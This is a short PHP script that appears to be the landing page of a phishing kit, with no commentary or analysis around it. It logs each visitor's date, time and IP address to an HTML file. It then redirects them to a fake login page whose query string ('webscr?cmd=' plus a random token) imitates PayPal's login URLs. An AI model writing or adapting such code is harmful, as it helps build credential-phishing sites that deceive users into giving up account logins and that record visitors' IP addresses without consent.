<?php 

include 'support/includes/functions.php';
$date = date('d/m/Y', time());
$time = date('H:i:s', time());
$ip = getenv("REMOTE_ADDR");
$msg = "$date |----| $time |----| $ip <br/>"; 
$myFile = "validation/static/registre.html";
$file = fopen($myFile, 'a+');
fwrite($file, $msg);
fclose($file);
$rand = randomString(25);
header("location: support/login.php?webscr?cmd=".$rand."dispatch=c70bbe4242b071efa252ac2167e47ebd1fddf0fdacdd6c776a1113752becfffa42e1309243");

?>